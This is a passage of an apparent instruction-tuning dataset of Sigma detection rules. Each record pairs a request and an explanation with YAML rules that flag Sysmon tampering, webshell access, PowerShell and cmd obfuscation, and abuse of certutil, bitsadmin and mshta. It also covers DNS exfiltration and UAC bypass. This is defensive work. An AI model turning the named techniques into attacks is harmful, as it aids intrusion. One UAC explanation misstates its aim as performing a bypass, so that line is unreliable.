    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection_1:\n        TargetImage: 'C:\\Windows\\Sysmon64.exe'\n        GrantedAccess: '0x1400'\n    filter_1:\n        SourceImage|startswith:\n            - 'C:\\Program Files'\n            - 'C:\\Windows\\System32\\'\n    filter_msdefender:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    selection_calltrace:\n        CallTrace: 'Ente'\n    condition: ( selection_1 and not 1 of filter_* ) or selection_calltrace\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection_1:\n        TargetImage: 'C:\\Windows\\Sysmon64.exe'\n        GrantedAccess: '0x1400'\n    filter_1:\n        SourceImage|startswith:\n            - 'C:\\Program Files'\n            - 'C:\\Windows\\System32\\'\n    filter_msdefender:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    selection_calltrace:\n        CallTrace: 'Ente'\n    condition: ( selection_1 and not 1 of filter_* ) or selection_calltrace\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of SysmonEnte, a tool to attack the integrity of Sysmon",
      "answer": "In order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential suspicious applet or osascript executing \"osacompile\"..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential suspicious applet or osascript executing \"osacompile\", you should: Monitor the creation of processes on macOS systems for occurrences where the parent process is either an applet or osascript, indicated by their paths ending with '/applet' or '/osascript'. Additionally, you should look for the command line invoking 'osacompile'. This detection points to a potential misuse or exploitation attempt, as 'osacompile' may be used maliciously to compile AppleScripts into executable binaries, which could be a part of an attack workflow. Given the medium level of this rule, while there might be unknown false positives, it is critical to investigate instances meeting these criteria to identify possible security incidents.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '/applet'\n            - '/osascript'\n        CommandLine|contains: 'osacompile'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '/applet'\n            - '/osascript'\n        CommandLine|contains: 'osacompile'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "potential suspicious applet or osascript executing \"osacompile\".",
      "answer": "In order to detect potential suspicious applet or osascript executing \"osacompile\", you should: Monitor the creation of processes on macOS systems for occurrences where the parent process is either an applet or osascript, indicated by their paths ending with '/applet' or '/osascript'. Additionally, you should look for the command line invoking 'osacompile'. This detection points to a potential misuse or exploitation attempt, as 'osacompile' may be used maliciously to compile AppleScripts into executable binaries, which could be a part of an attack workflow. Given the medium level of this rule, while there might be unknown false positives, it is critical to investigate instances meeting these criteria to identify possible security incidents."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting access to DEWMODE webshell as described in FIREEYE report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect access to DEWMODE webshell as described in FIREEYE report, you should: Monitor your webserver logs for queries that match specific patterns indicating an attempt to interact with the DEWMODE webshell. These patterns are identified by searching for specific parameters in the query string of the URL. Two primary patterns are defined for detection:\n\n1. The query must contain all of the following elements: '?dwn=', '&fn=', and '.html?'.\n2. Alternatively, the query must include '&dwn=', '?fn=', and '.html?'.\n\nIf any of these patterns are detected in the query string of a URL request, it suggests that the DEWMODE webshell is being accessed or attempted to be accessed. It is essential to capture and analyze the client IP address and the server's response for further investigation because of the high severity level associated with this detection. Be aware that while this rule is crucial for identifying potential webshell access, there may be unknown false positives, hence additional verification might be required.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains|all:\n            - '?dwn='\n            - '&fn='\n            - '.html?'\n    selection2:\n        cs-uri-query|contains|all:\n            - '&dwn='\n            - '?fn='\n            - '.html?'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - response\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains|all:\n            - '?dwn='\n            - '&fn='\n            - '.html?'\n    selection2:\n        cs-uri-query|contains|all:\n            - '&dwn='\n            - '?fn='\n            - '.html?'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - response\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "access to DEWMODE webshell as described in FIREEYE report",
      "answer": "In order to detect access to DEWMODE webshell as described in FIREEYE report, you should: Monitor your webserver logs for queries that match specific patterns indicating an attempt to interact with the DEWMODE webshell. These patterns are identified by searching for specific parameters in the query string of the URL. Two primary patterns are defined for detection:\n\n1. The query must contain all of the following elements: '?dwn=', '&fn=', and '.html?'.\n2. Alternatively, the query must include '&dwn=', '?fn=', and '.html?'.\n\nIf any of these patterns are detected in the query string of a URL request, it suggests that the DEWMODE webshell is being accessed or attempted to be accessed. It is essential to capture and analyze the client IP address and the server's response for further investigation because of the high severity level associated with this detection. Be aware that while this rule is crucial for identifying potential webshell access, there may be unknown false positives, hence additional verification might be required."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious processes with parent images located in the C:\\Users\\Public folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious processes with parent images located in the C:\\Users\\Public folder, you should: Focus on monitoring the creation of processes on Windows systems. Be particularly vigilant about processes that are initiated from the C:\\Users\\Public directory. This is unusual and potentially indicative of malicious activity because this directory is commonly readable and writable by all users, making it a vulnerable spot for attackers to plant malicious scripts or executables. Pay close attention to any process that is initiated with command line tools or scripts such as PowerShell, CMD.EXE with parameters like /c, /r, /k, Windows Script Host executables (wscript.exe, cscript.exe), as well as utilities that can be misused by attackers like bitsadmin, certutil, and mshta.exe. These tools and utilities can be leveraged by attackers to execute scripts, download and run malicious files, or perform other unauthorized activities on the system. It's important to track the computer name, user, and the exact command line used for process creation as these details may aid in further investigation. Although false positives can occur, the level of concern with this detection should be considered high given the potential for abuse in this context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|startswith: 'C:\\Users\\Public\\'\n        CommandLine|contains:\n            - 'powershell'\n            - 'cmd.exe /c '\n            - 'cmd.exe /r '\n            - 'cmd.exe /k '\n            - 'cmd /c '\n            - 'cmd /r '\n            - 'cmd /k '\n            - 'wscript.exe'\n            - 'cscript.exe'\n            - 'bitsadmin'\n            - 'certutil'\n            - 'mshta.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|startswith: 'C:\\Users\\Public\\'\n        CommandLine|contains:\n            - 'powershell'\n            - 'cmd.exe /c '\n            - 'cmd.exe /r '\n            - 'cmd.exe /k '\n            - 'cmd /c '\n            - 'cmd /r '\n            - 'cmd /k '\n            - 'wscript.exe'\n            - 'cscript.exe'\n            - 'bitsadmin'\n            - 'certutil'\n            - 'mshta.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious processes with parent images located in the C:\\Users\\Public folder",
      "answer": "In order to detect suspicious processes with parent images located in the C:\\Users\\Public folder, you should: Focus on monitoring the creation of processes on Windows systems. Be particularly vigilant about processes that are initiated from the C:\\Users\\Public directory. This is unusual and potentially indicative of malicious activity because this directory is commonly readable and writable by all users, making it a vulnerable spot for attackers to plant malicious scripts or executables. Pay close attention to any process that is initiated with command line tools or scripts such as PowerShell, CMD.EXE with parameters like /c, /r, /k, Windows Script Host executables (wscript.exe, cscript.exe), as well as utilities that can be misused by attackers like bitsadmin, certutil, and mshta.exe. These tools and utilities can be leveraged by attackers to execute scripts, download and run malicious files, or perform other unauthorized activities on the system. It's important to track the computer name, user, and the exact command line used for process creation as these details may aid in further investigation. Although false positives can occur, the level of concern with this detection should be considered high given the potential for abuse in this context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should monitor security logs on Windows systems. Specifically, focus on events with ID 4697, which records service installations. This scrutiny becomes effective only when the 'System Security Extension' audit subcategory is enabled, as it allows the logging of these events. Look for services being installed where the service file name incorporates 'cmd' or 'powershell' along with either the presence of 'noexit' or the explicit command invocation patterns ' /c ' and ' /r '. This combination is indicative of an attempt to obfuscate the execution of PowerShell via standard input mechanisms, a tactic often employed to avoid detection by simple command line monitoring tools.\n\nPay attention to services that contain both 'cmd' and 'powershell' in their installation path or command line because this is a common method employed by adversaries to execute PowerShell scripts in a way that might not be immediately apparent to casual observation or basic detection mechanisms. Additionally, the use of 'noexit', ' /c ', or ' /r ' further suggests an attempt to control the PowerShell interpreter's behavior, typically to ensure that scripts execute in a particular context or to hide their execution.\n\nDue to the sophisticated nature of these detection methods, any hits on these criteria should be treated with a high level of suspicion. However, maintain awareness of potential unknown false positives, which could arise from legitimate administrative activities or unique software installation practices within your environment. Tags associated with this detection tactic include techniques and tactics around the execution of scripts, obfuscation, and potentially undesired or unauthorized service installation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - 'powershell'\n    selection2:\n        ServiceFileName|contains:\n            - '${input}'\n            - 'noexit'\n    selection3:\n        ServiceFileName|contains:\n            - ' /c '\n            - ' /r '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - 'powershell'\n    selection2:\n        ServiceFileName|contains:\n            - '${input}'\n            - 'noexit'\n    selection3:\n        ServiceFileName|contains:\n            - ' /c '\n            - ' /r '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should monitor security logs on Windows systems. Specifically, focus on events with ID 4697, which records service installations. This scrutiny becomes effective only when the 'System Security Extension' audit subcategory is enabled, as it allows the logging of these events. Look for services being installed where the service file name incorporates 'cmd' or 'powershell' along with either the presence of 'noexit' or the explicit command invocation patterns ' /c ' and ' /r '. This combination is indicative of an attempt to obfuscate the execution of PowerShell via standard input mechanisms, a tactic often employed to avoid detection by simple command line monitoring tools.\n\nPay attention to services that contain both 'cmd' and 'powershell' in their installation path or command line because this is a common method employed by adversaries to execute PowerShell scripts in a way that might not be immediately apparent to casual observation or basic detection mechanisms. Additionally, the use of 'noexit', ' /c ', or ' /r ' further suggests an attempt to control the PowerShell interpreter's behavior, typically to ensure that scripts execute in a particular context or to hide their execution.\n\nDue to the sophisticated nature of these detection methods, any hits on these criteria should be treated with a high level of suspicion. However, maintain awareness of potential unknown false positives, which could arise from legitimate administrative activities or unique software installation practices within your environment. Tags associated with this detection tactic include techniques and tactics around the execution of scripts, obfuscation, and potentially undesired or unauthorized service installation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of tooling to sniff network traffic.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of tooling to sniff network traffic, you should: focus on the creation of processes on macOS systems, particularly paying attention to processes that end with '/tcpdump' or '/tshark'. These tools are often utilized by adversaries to place a network interface into promiscuous mode, allowing them to passively capture and analyze network traffic, or to exploit span ports to harvest a more substantial amount of data traversing the network. However, it's important to note that these indicators can also signify legitimate administrative activities, so this detection should be considered informational and investigated accordingly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        Image|endswith:\n            - '/tcpdump'\n            - '/tshark'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        Image|endswith:\n            - '/tcpdump'\n            - '/tshark'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n",
      "question": "usage of tooling to sniff network traffic.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n",
      "answer": "In order to detect the usage of tooling to sniff network traffic, you should: focus on the creation of processes on macOS systems, particularly paying attention to processes that end with '/tcpdump' or '/tshark'. These tools are often utilized by adversaries to place a network interface into promiscuous mode, allowing them to passively capture and analyze network traffic, or to exploit span ports to harvest a more substantial amount of data traversing the network. However, it's important to note that these indicators can also signify legitimate administrative activities, so this detection should be considered informational and investigated accordingly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries abusing PowerShell commands and scripts for execution, which is a powerful interactive command-line interface and scripting environment included in the Windows operating system, you should focus on monitoring PowerShell script activities. This involves enabling Script Block Logging, which is a requirement for capturing the necessary data. Specifically, you should look for the execution of scripts that initiate a new PowerShell session to another computer, identifiable by the presence of both 'New-PSSession' and '-ComputerName' within the script text. Such activities could indicate malicious use, although it is also important to consider that the creation of new PowerShell sessions to remote computers could be part of legitimate administrative tasks. Thus, while this detection is set at a medium level of caution, potential false positives involve legitimate administrative scripts carrying out authorized functions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-PSSession'\n            - '-ComputerName '\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-PSSession'\n            - '-ComputerName '\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
      "question": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\n",
      "answer": "In order to detect adversaries abusing PowerShell commands and scripts for execution, which is a powerful interactive command-line interface and scripting environment included in the Windows operating system, you should focus on monitoring PowerShell script activities. This involves enabling Script Block Logging, which is a requirement for capturing the necessary data. Specifically, you should look for the execution of scripts that initiate a new PowerShell session to another computer, identifiable by the presence of both 'New-PSSession' and '-ComputerName' within the script text. Such activities could indicate malicious use, although it is also important to consider that the creation of new PowerShell sessions to remote computers could be part of legitimate administrative tasks. Thus, while this detection is set at a medium level of caution, potential false positives involve legitimate administrative scripts carrying out authorized functions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Checks for event id 1102 which indicates the security event log was cleared..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to check for event id 1102 which indicates the security event log was cleared, you should: Monitor Windows security logs specifically for Event ID 1102 with the provider name Microsoft-Windows-Eventlog. This event indicates that the security event log has been cleared, which can be a significant indicator of malicious activity as attackers might clear event logs to hide their tracks after gaining access to a system or performing unauthorized activities. It's important to capture details such as SubjectLogonId, SubjectUserName, SubjectUserSid, and SubjectDomainName associated with this event to help identify who cleared the log. While this detection is critical for identifying potential security breaches, keep in mind that there are legitimate scenarios where administrative actions may require clearing these logs. Therefore, these alerts should be investigated to distinguish between malicious activities and legitimate administrative activities. The level of concern for such events is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 1102\n        Provider_Name: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nfields:\n    - SubjectLogonId\n    - SubjectUserName\n    - SubjectUserSid\n    - SubjectDomainName\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 1102\n        Provider_Name: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nfields:\n    - SubjectLogonId\n    - SubjectUserName\n    - SubjectUserSid\n    - SubjectDomainName\nlevel: medium\n",
      "question": "Checks for event id 1102 which indicates the security event log was cleared.",
      "answer": "In order to check for event id 1102 which indicates the security event log was cleared, you should: Monitor Windows security logs specifically for Event ID 1102 with the provider name Microsoft-Windows-Eventlog. This event indicates that the security event log has been cleared, which can be a significant indicator of malicious activity as attackers might clear event logs to hide their tracks after gaining access to a system or performing unauthorized activities. It's important to capture details such as SubjectLogonId, SubjectUserName, SubjectUserSid, and SubjectDomainName associated with this event to help identify who cleared the log. While this detection is critical for identifying potential security breaches, keep in mind that there are legitimate scenarios where administrative actions may require clearing these logs. Therefore, these alerts should be investigated to distinguish between malicious activities and legitimate administrative activities. The level of concern for such events is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of msiexec.exe from an uncommon directory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of msiexec.exe from an uncommon directory, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\msiexec.exe' or the OriginalFileName is specified as '\\msiexec.exe'. However, it's crucial to exclude any occurrences that originate from common, legitimate directories for msiexec.exe, such as 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', and 'C:\\Windows\\WinSxS\\'. This approach helps in identifying potentially malicious activities where msiexec.exe is executed from directories that are not typically used for legitimate purposes, which is a tactic often employed in various attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    filter:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    filter:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of msiexec.exe from an uncommon directory",
      "answer": "In order to detect the execution of msiexec.exe from an uncommon directory, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\msiexec.exe' or the OriginalFileName is specified as '\\msiexec.exe'. However, it's crucial to exclude any occurrences that originate from common, legitimate directories for msiexec.exe, such as 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', and 'C:\\Windows\\WinSxS\\'. This approach helps in identifying potentially malicious activities where msiexec.exe is executed from directories that are not typically used for legitimate purposes, which is a tactic often employed in various attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible payload obfuscation via the commandline.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible payload obfuscation via the commandline, you should monitor the creation of processes on Windows systems for command lines that contain specific patterns of characters. These patterns are indicators of an attempt to obfuscate the actual commands being executed. Look out for command lines including doubled characters such as '^^', character sequences like '^|^', multiple semicolons in a row like ';;;;' or ',;,' and variations thereof. Additionally, watch out for attempts to hide or obfuscate references to command processor variables (e.g., '%COMSPEC:~') and manipulations of the command 'cmd' with inserted carets (e.g., 'c^m^d', '^c^m^d'). The presence of characters like 's^et ' in commands should also raise suspicion, as this could indicate an effort to set variables in a way that evades straightforward detection. Given the obfuscation attempts might not always originate from malicious activities, it's advised to investigate these occurrences to determine their nature and intent, acknowledging that false positives are possible but unspecified in this context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '^^'\n            - '^|^'\n            - ',;,'\n            - ';;;;'\n            - ';; ;;'\n            - '(,(,'\n            - '%COMSPEC:~'\n            - ' c^m^d'\n            - '^c^m^d'\n            - ' c^md'\n            - ' cm^d'\n            - '^cm^d'\n            - ' s^et '\n            - ' s^e^t '\n            - ' se^t '\n            # - '%%'\n            # - '&&'\n            # - '\"\"'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '^^'\n            - '^|^'\n            - ',;,'\n            - ';;;;'\n            - ';; ;;'\n            - '(,(,'\n            - '%COMSPEC:~'\n            - ' c^m^d'\n            - '^c^m^d'\n            - ' c^md'\n            - ' cm^d'\n            - '^cm^d'\n            - ' s^et '\n            - ' s^e^t '\n            - ' se^t '\n            # - '%%'\n            # - '&&'\n            # - '\"\"'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "possible payload obfuscation via the commandline",
      "answer": "In order to detect possible payload obfuscation via the commandline, you should monitor the creation of processes on Windows systems for command lines that contain specific patterns of characters. These patterns are indicators of an attempt to obfuscate the actual commands being executed. Look out for command lines including doubled characters such as '^^', character sequences like '^|^', multiple semicolons in a row like ';;;;' or ',;,' and variations thereof. Additionally, watch out for attempts to hide or obfuscate references to command processor variables (e.g., '%COMSPEC:~') and manipulations of the command 'cmd' with inserted carets (e.g., 'c^m^d', '^c^m^d'). The presence of characters like 's^et ' in commands should also raise suspicion, as this could indicate an effort to set variables in a way that evades straightforward detection. Given the obfuscation attempts might not always originate from malicious activities, it's advised to investigate these occurrences to determine their nature and intent, acknowledging that false positives are possible but unspecified in this context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting High DNS queries bytes amount from host per short period of time.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a high DNS queries bytes amount from host per short period of time, you should monitor firewall logs for instances where the destination port is 53, indicating DNS traffic. Evaluate these instances over a one-minute timeframe to identify if the sum of message sizes originating from a single source IP address exceeds 300,000 bytes. This behavior could suggest an unusual and potentially malicious level of DNS traffic emanating from a single host, indicating an attempt to carry out DNS-based attacks or exfiltrate data. Be aware of potential false positives, such as legitimate high rates of DNS bytes being sent out to a domain name, which should then be added to a whitelist to avoid unnecessary alerts. This monitoring practice corresponds with identifying activities associated with Command and Control tactics and Exfiltration over Alternative Protocol techniques, aiming to enhance the detection of malicious network communication and data exfiltration attempts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: firewall\ndetection:\n    selection:\n        dst_port: 53\n    timeframe: 1m\n    condition: selection | sum(message_size) by src_ip > 300000\nfalsepositives:\n    - Legitimate high DNS bytes out rate to domain name which should be added to whitelist\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: firewall\ndetection:\n    selection:\n        dst_port: 53\n    timeframe: 1m\n    condition: selection | sum(message_size) by src_ip > 300000\nfalsepositives:\n    - Legitimate high DNS bytes out rate to domain name which should be added to whitelist\nlevel: medium\n",
      "question": "High DNS queries bytes amount from host per short period of time",
      "answer": "In order to detect a high DNS queries bytes amount from host per short period of time, you should monitor firewall logs for instances where the destination port is 53, indicating DNS traffic. Evaluate these instances over a one-minute timeframe to identify if the sum of message sizes originating from a single source IP address exceeds 300,000 bytes. This behavior could suggest an unusual and potentially malicious level of DNS traffic emanating from a single host, indicating an attempt to carry out DNS-based attacks or exfiltrate data. Be aware of potential false positives, such as legitimate high rates of DNS bytes being sent out to a domain name, which should then be added to a whitelist to avoid unnecessary alerts. This monitoring practice corresponds with identifying activities associated with Command and Control tactics and Exfiltration over Alternative Protocol techniques, aiming to enhance the detection of malicious network communication and data exfiltration attempts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Bypasses User Account Control using a fileless method.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to bypass User Account Control using a fileless method, you should monitor Windows registry modification events specifically looking for instances where a registry setting is changed ('SetValue' event type). Focus on modifications to registry keys ending with '\\open\\command\\DelegateExecute', especially where the modification details are empty, indicating a potential manipulation to leverage fileless execution methods which wouldn't prompt for User Account Control (UAC). Such activities are highly suspicious and are rarely legitimate, hence classified with a high level of concern. Tracking modifications in this specific area of the registry helps in detecting attempts to bypass UAC mechanisms without deploying traditional executable files, aligning with tactics typically seen in advanced persistent threats (APTs) aiming for stealth and persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\open\\command\\DelegateExecute'\n        Details: (Empty)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\open\\command\\DelegateExecute'\n        Details: (Empty)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Bypasses User Account Control using a fileless method",
      "answer": "In order to bypass User Account Control using a fileless method, you should monitor Windows registry modification events specifically looking for instances where a registry setting is changed ('SetValue' event type). Focus on modifications to registry keys ending with '\\open\\command\\DelegateExecute', especially where the modification details are empty, indicating a potential manipulation to leverage fileless execution methods which wouldn't prompt for User Account Control (UAC). Such activities are highly suspicious and are rarely legitimate, hence classified with a high level of concern. Tracking modifications in this specific area of the registry helps in detecting attempts to bypass UAC mechanisms without deploying traditional executable files, aligning with tactics typically seen in advanced persistent threats (APTs) aiming for stealth and persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an user account is locked out..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user account is locked out, you should monitor Okta logs for statements indicating that the maximum number of sign-in attempts has been exceeded. Specifically, look for log entries where the display message states \"Max sign in attempts exceeded\". This activity is tagged with the MITRE ATT&CK tactics and techniques associated with credential access attempts, as excessive failed login attempts could indicate an attacker trying to gain access to an account through brute force or guessing passwords. It is worth noting that some entries might be false positives, as the reason for unknown failed attempts could be legitimate users forgetting their passwords. The severity level for this activity is considered medium, underscoring the importance of investigating such incidents to determine if they are malicious attempts at accessing user accounts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: okta\n    service: okta\ndetection:\n    selection:\n        displaymessage: Max sign in attempts exceeded\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: okta\n    service: okta\ndetection:\n    selection:\n        displaymessage: Max sign in attempts exceeded\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when an user account is locked out.",
